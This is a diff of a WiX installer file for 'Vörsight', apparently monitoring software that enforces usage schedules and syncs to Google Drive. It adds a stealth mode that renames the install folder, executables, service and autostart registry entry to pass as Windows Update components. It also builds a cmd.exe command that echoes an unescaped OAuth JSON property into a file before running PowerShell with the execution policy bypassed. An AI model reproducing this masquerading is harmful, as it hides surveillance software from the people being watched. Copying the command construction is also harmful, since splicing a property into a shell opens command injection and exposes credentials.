@@ -1,7 +1,6 @@
 <Wix xmlns="http://wixtoolset.org/schemas/v4/wxs" xmlns:ui="http://wixtoolset.org/schemas/v4/wxs/ui">
   <Package Name="Vörsight" Manufacturer="Vörsight" Version="1.0.0.0" UpgradeCode="a2b3c4d5-e6f7-8901-2345-6789abcdef01">
     <MajorUpgrade DowngradeErrorMessage="A newer version of [ProductName] is already installed." />
-    
     <MediaTemplate EmbedCab="yes" />
 
     <StandardDirectory Id="ProgramFiles64Folder">
@@ -20,65 +19,30 @@
     <Property Id="USE_STEALTH_MODE" Value="0" />
     <Property Id="OAUTH_JSON" Secure="yes" Hidden="yes" />
     
-    <!-- Conditional naming properties -->
-    <SetProperty Id="APPFOLDER_NAME" Value="Vörsight" Before="CostFinalize" Sequence="first">
-      NOT USE_STEALTH_MODE
-    </SetProperty>
-    <SetProperty Id="APPFOLDER_NAME" Value="Windows Update Helper" Before="CostFinalize" Sequence="first">
-      USE_STEALTH_MODE
-    </SetProperty>
+    <!-- Default naming (normal mode) -->
+    <Property Id="APPFOLDER_NAME" Value="Vörsight" />
+    <Property Id="SERVICE_EXE_NAME" Value="Vorsight.Service.exe" />
+    <Property Id="AGENT_EXE_NAME" Value="Vorsight.Agent.exe" />
+    <Property Id="SERVICE_NAME" Value="VorsightService" />
+    <Property Id="SERVICE_DISPLAY_NAME" Value="Vorsight Monitoring Service" />
+    <Property Id="SERVICE_DESCRIPTION" Value="Monitors system usage and enforces access schedules." />
+    <Property Id="AGENT_REGISTRY_NAME" Value="VorsightAgent" />
     
-    <SetProperty Id="SERVICE_EXE_NAME" Value="Vorsight.Service.exe" Before="CostFinalize" Sequence="first">
-      NOT USE_STEALTH_MODE
-    </SetProperty>
-    <SetProperty Id="SERVICE_EXE_NAME" Value="WindowsUpdateService.exe" Before="CostFinalize" Sequence="first">
-      USE_STEALTH_MODE
-    </SetProperty>
-    
-    <SetProperty Id="AGENT_EXE_NAME" Value="Vorsight.Agent.exe" Before="CostFinalize" Sequence="first">
-      NOT USE_STEALTH_MODE
-    </SetProperty>
-    <SetProperty Id="AGENT_EXE_NAME" Value="wuhelper.exe" Before="CostFinalize" Sequence="first">
-      USE_STEALTH_MODE
-    </SetProperty>
-    
-    <SetProperty Id="SERVICE_NAME" Value="VorsightService" Before="CostFinalize" Sequence="first">
-      NOT USE_STEALTH_MODE
-    </SetProperty>
-    <SetProperty Id="SERVICE_NAME" Value="WUHelperService" Before="CostFinalize" Sequence="first">
-      USE_STEALTH_MODE
-    </SetProperty>
-    
-    <SetProperty Id="SERVICE_DISPLAY_NAME" Value="Vorsight Monitoring Service" Before="CostFinalize" Sequence="first">
-      NOT USE_STEALTH_MODE
-    </SetProperty>
-    <SetProperty Id="SERVICE_DISPLAY_NAME" Value="Windows Update Helper Service" Before="CostFinalize" Sequence="first">
-      USE_STEALTH_MODE
-    </SetProperty>
-    
-    <SetProperty Id="SERVICE_DESCRIPTION" Value="Monitors system usage and enforces access schedules." Before="CostFinalize" Sequence="first">
-      NOT USE_STEALTH_MODE
-    </SetProperty>
-    <SetProperty Id="SERVICE_DESCRIPTION" Value="Provides background update checking and system health monitoring." Before="CostFinalize" Sequence="first">
-      USE_STEALTH_MODE
-    </SetProperty>
-    
-    <SetProperty Id="AGENT_REGISTRY_NAME" Value="VorsightAgent" Before="CostFinalize" Sequence="first">
-      NOT USE_STEALTH_MODE
-    </SetProperty>
-    <SetProperty Id="AGENT_REGISTRY_NAME" Value="WindowsUpdateHelper" Before="CostFinalize" Sequence="first">
-      USE_STEALTH_MODE
-    </SetProperty>
-    
-    <!-- Other properties moved to ConfigDialog.wxs -->
+    <!-- Stealth mode overrides -->
+    <SetProperty Id="APPFOLDER_NAME" Value="Windows Update Helper" Before="CostFinalize" Sequence="first" Condition="USE_STEALTH_MODE" />
+    <SetProperty Id="SERVICE_EXE_NAME" Value="WindowsUpdateService.exe" Before="CostFinalize" Sequence="first" Condition="USE_STEALTH_MODE" />
+    <SetProperty Id="AGENT_EXE_NAME" Value="wuhelper.exe" Before="CostFinalize" Sequence="first" Condition="USE_STEALTH_MODE" />
+    <SetProperty Id="SERVICE_NAME" Value="WUHelperService" Before="CostFinalize" Sequence="first" Condition="USE_STEALTH_MODE" />
+    <SetProperty Id="SERVICE_DISPLAY_NAME" Value="Windows Update Helper Service" Before="CostFinalize" Sequence="first" Condition="USE_STEALTH_MODE" />
+    <SetProperty Id="SERVICE_DESCRIPTION" Value="Provides background update checking and system health monitoring." Before="CostFinalize" Sequence="first" Condition="USE_STEALTH_MODE" />
+    <SetProperty Id="AGENT_REGISTRY_NAME" Value="WindowsUpdateHelper" Before="CostFinalize" Sequence="first" Condition="USE_STEALTH_MODE" />
     
     <!-- UI Configuration -->
     <ui:WixUI Id="WixUI_InstallDir" InstallDirectory="INSTALLFOLDER" />
     
-    <!-- Custom UI to insert our configuration dialog -->
+    <!-- Insert custom dialogs into install flow -->
     <UI>
       <Publish Dialog="InstallDirDlg" Control="Next" Event="NewDialog" Value="ConfigDialog" Order="3" Condition="1" />
-      <Publish Dialog="ConfigDialog" Control="Next" Event="NewDialog" Value="GoogleDriveDialog" Order="3" Condition="1" />
     </UI>
   </Package>
 
@@ -101,12 +65,6 @@
         <File Id="ServiceConfig" Source="..\Vorsight.Service\appsettings.json" />
       </Component>
       
-      <!-- Optional: Google Drive Secrets if available at build time -->
-      <!-- <Component Id="ServiceSecretsComponent" Guid="*" Bitness="always64">
-        <File Id="ServiceSecrets" Source="..\Vorsight.Service\oauth.json" />
-      </Component> -->
-      
-      <!-- PowerShell OAuth script -->
       <Component Id="OAuthScriptComponent" Guid="*" Bitness="always64">
         <File Id="OAuthScript" Source="ConfigureGoogleDrive.ps1" />
       </Component>
@@ -115,12 +73,10 @@
     <ComponentGroup Id="AgentComponents" Directory="INSTALLFOLDER">
       <Component Id="VorsightAgentComponent" Guid="*" Bitness="always64">
         <File Id="VorsightAgentExe" Source="..\Vorsight.Agent\bin\Release\net10.0-windows\win-x64\publish\Vorsight.Agent.exe" Name="[AGENT_EXE_NAME]" KeyPath="yes" />
-        <!-- Auto-start Registry Key for the Agent -->
         <RegistryValue Root="HKLM" Key="Software\Microsoft\Windows\CurrentVersion\Run" Name="[AGENT_REGISTRY_NAME]" Type="string" Value="[INSTALLFOLDER][AGENT_EXE_NAME]" />
       </Component>
     </ComponentGroup>
     
-    <!-- Google Drive Credentials Folder -->
     <Component Id="DriveCredentialsFolder" Guid="{B7C2E5F8-3A4D-41B9-8C7E-9D3F2A1B4E6C}" Directory="DRIVECREDENTIALSFOLDER" Bitness="always64">
       <CreateFolder>
         <util:PermissionEx xmlns:util="http://wixtoolset.org/schemas/v4/wxs/util" User="[WIX_ACCOUNT_LOCALSYSTEM]" GenericAll="yes" />
@@ -129,46 +85,17 @@
       <RegistryValue Root="HKCU" Key="Software\Vorsight" Name="DriveCredentialsInstalled" Type="integer" Value="1" KeyPath="yes" />
     </Component>
     
-    <!-- Custom Actions for Google Drive Setup -->
-    <!-- Save OAuth JSON to file if provided -->
-    <CustomAction Id="SaveOAuthJson" Script="vbscript" Execute="deferred" Impersonate="no">
-      <![CDATA[
-        On Error Resume Next
-        Dim fso, file, installDir, oauthJson, separator
-        Dim customData
-        customData = Session.Property("CustomActionData")
-        
-        separator = InStr(customData, "|")
-        If separator > 0 Then
-          installDir = Left(customData, separator - 1)
-          oauthJson = Mid(customData, separator + 1)
-          
-          If Len(oauthJson) > 10 Then
-            Set fso = CreateObject("Scripting.FileSystemObject")
-            Set file = fso.CreateTextFile(installDir & "oauth.json", True)
-            file.Write oauthJson
-            file.Close
-          End If
-        End If
-      ]]>
-    </CustomAction>
-    
-    <SetProperty Id="SaveOAuthJson" Value="[INSTALLFOLDER]|[OAUTH_JSON]" Before="SaveOAuthJson" Sequence="execute" />
-    
-    <!-- Run PowerShell OAuth configuration -->
+    <!-- PowerShell OAuth configuration - passes OAUTH_JSON directly to script -->
     <CustomAction Id="ConfigureGoogleDrive" 
+                  Directory="INSTALLFOLDER"
+                  ExeCommand='cmd.exe /c "echo [OAUTH_JSON] &gt; oauth.json &amp;&amp; powershell.exe -ExecutionPolicy Bypass -File ConfigureGoogleDrive.ps1 -InstallDir &quot;[INSTALLFOLDER]&quot;"'
                   Execute="deferred"
                   Impersonate="yes"
-                  ExeCommand='cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File "[INSTALLFOLDER]ConfigureGoogleDrive.ps1" -InstallDir "[INSTALLFOLDER]"'
                   Return="ignore" />
     
-    <SetProperty Id="ConfigureGoogleDrive" Value="[INSTALLFOLDER]" Before="ConfigureGoogleDrive" Sequence="execute" />
-    
     <InstallExecuteSequence>
-      <Custom Action="SaveOAuthJson" After="InstallFiles">NOT Installed AND OAUTH_JSON</Custom>
-      <Custom Action="ConfigureGoogleDrive" After="SaveOAuthJson">NOT Installed AND OAUTH_JSON</Custom>
+      <Custom Action="ConfigureGoogleDrive" After="InstallFiles" Condition="NOT Installed AND OAUTH_JSON" />
     </InstallExecuteSequence>
   </Fragment>
 
 </Wix>
-
